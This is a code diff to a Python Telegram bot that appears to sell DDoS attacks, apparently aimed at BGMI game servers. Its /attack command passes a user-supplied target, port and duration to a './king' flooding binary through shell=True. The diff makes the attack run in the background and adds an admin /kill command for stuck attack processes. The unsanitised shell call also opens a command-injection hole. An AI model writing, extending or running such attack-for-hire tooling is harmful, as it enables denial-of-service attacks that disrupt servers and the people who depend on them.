@@ -321,8 +321,8 @@ def handle_attack(message):
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./king {target} {port} {time} 100"
-                subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
+                subprocess.Popen(full_command, shell=True)
+                response = f"BGMI Attack Started. Target: {target} Port: {port} Time: {time} seconds"
         else:
             response = "✅ Usage :- /attack <target> <port> <time>"  # Updated command syntax
     else:
@@ -440,6 +440,7 @@ def welcome_plan(message):
 💥 /broadcast : Broadcast a Message.
 💥 /clearlogs : Clear The Logs File.
 💥 /clearusers : Clear The USERS File.
+💥 /kill : Kill Hanging Attack Processes.
 '''
     bot.reply_to(message, response)
 
@@ -466,7 +467,18 @@ def broadcast_message(message):
 
     bot.reply_to(message, response)
 
+@bot.message_handler(commands=['kill'])
+def kill_processes(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_id:
+        try:
+            subprocess.run("pkill -f king", shell=True)
+            response = "All attack processes killed successfully! Server freed."
+        except Exception as e:
+            response = f"Failed to kill processes: {str(e)}"
+    else:
+        response = "Only Admin Can Run This Command."
 
-
+    bot.reply_to(message, response)
 
 bot.polling()
